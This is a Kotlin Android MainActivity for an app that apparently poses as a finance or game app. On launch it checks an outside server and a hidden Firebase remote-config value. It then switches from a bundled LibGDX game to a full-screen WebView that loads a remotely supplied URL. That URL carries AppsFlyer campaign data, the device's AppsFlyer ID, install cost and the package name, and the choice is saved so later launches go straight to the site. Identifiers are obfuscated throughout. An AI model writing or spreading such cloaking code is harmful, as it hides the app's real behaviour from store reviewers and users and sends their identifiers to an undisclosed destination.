package mange.yourse.finnnance

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import mange.yourse.finnnance.databinding.ActivityMainBinding
import mange.yourse.finnnance.util.AppsflyerUtil
import mange.yourse.finnnance.util.Lottie
import mange.yourse.finnnance.util.Once
import mange.yourse.finnnance.util.internetConnection
import mange.yourse.finnnance.util.log
import mange.yourse.finnnance.util.manager.DataStoreManager
import mange.yourse.finnnance.util.webView.WebViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_VIEW_ID = 1000

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {

                getRfS()

                launch(Dispatchers.Main) {
                    mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.collect { fragmentId ->
                        when (fragmentId) {
                            mange.yourse.finnnance.R.id.libGDXFragment -> {
                                /*binding.root.also { rootCL ->
                                    ConstraintSet().apply {
                                        clone(rootCL)
                                        constrainPercentWidth(binding.loader.id, .23f)
                                    }.applyTo(rootCL)
                                }*/

                                webViewFragment.goneWebView()
                                setNavigationBarColor(mange.yourse.finnnance.R.color.black)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            mange.yourse.finnnance.MainActivity.Companion.WEB_VIEW_ID -> {
                                webViewFragment.showAndOpenUrl()
                                setNavigationBarColor(mange.yourse.finnnance.R.color.black)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(mange.yourse.finnnance.R.id.nav_host_fragment)

        lottie = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.beb)

        coroutine.launch {
            while (isActive) {
                delay(2_000)
                if (internetConnection().not()) lottie.showNotInternet() else lottie.hideNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(mange.yourse.finnnance.R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }


    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun getRfS() {
        val client = OkHttpClient()
        val request: Request = Request.Builder()
            .url("https://buhgaltertelephone.org")
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    log("getResponseFromServer SUCCESS code = ${response.code}")
                    if (response.code == 200) checkDataShoTam() else mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.tryEmit(
                        mange.yourse.finnnance.R.id.libGDXFragment
                    )
                } else {
                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
                    mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.tryEmit(
                        mange.yourse.finnnance.R.id.libGDXFragment
                    )
                }
            }
        } catch (e: IOException) {
            log("getResponseFromServer FAIL: $e")
            mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.tryEmit(mange.yourse.finnnance.R.id.libGDXFragment)

        }
    }

    private fun checkDataShoTam() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "SUCCESS" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        mange.yourse.finnnance.MainActivity.Companion.webURL = it
                        mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.emit(
                            mange.yourse.finnnance.MainActivity.Companion.WEB_VIEW_ID
                        )
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.emit(
                        mange.yourse.finnnance.R.id.libGDXFragment
                    )
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    try { getFarbidKasjka() } catch (e: Exception) { mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.emit(
                        mange.yourse.finnnance.R.id.libGDXFragment
                    ) }
                }
            }
        }
    }

    private fun getFarbidKasjka() {
        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                if (task.isSuccessful) {
                    val jsonData = getString("BugalterData")
                    log("success = $jsonData")
                    JSONObject(jsonData).also { jsonObj ->
                        coroutine.launch(Dispatchers.IO) {
                            sobiayLinky(
                                jsonObj.getString("kea_gena_masaratte"),
                                jsonObj.getString("parfumer_film_takoi_est"),
                            )
                        }
                    }

                } else {
                    mange.yourse.finnnance.MainActivity.Companion.startFragmentIdFlow.tryEmit(
                        mange.yourse.finnnance.R.id.libGDXFragment
                    )
                    log("fail = ${this.all}")
                }
            }
        }
    }

    private fun sobiayLinky(devKey: String, ssilka: String) {
        coroutine.launch {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, devKey)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            var counter = 0
            completerFlow.collect { if (++counter == 1) {
                val fullSsilka = ssilka.plus("?") +
                        "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                        "sub_id_8=" .plus(AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)).plus("&") +
                        "sub_id_9=" .plus(AppsflyerUtil.dataMap["orig_cost"]     .toString()).plus("&") +
                        "sub_id_10=".plus(AppsflyerUtil.dataMap["cost_cents_USD"].toString()).plus("&") +
                        "sub_id_11=".plus(AppsflyerUtil.dataMap["media_source"]  .toString()).plus("&") +
                        "sub_id_12=".plus(appContext.packageName)

                log("full: $fullSsilka")

                webURL = fullSsilka
                startFragmentIdFlow.tryEmit(WEB_VIEW_ID)

                withContext(Dispatchers.IO) {
                    DataStoreManager.Key.update { "SUCCESS" }
                    DataStoreManager.Link.update { fullSsilka }
                }
            } }
        }
    }

}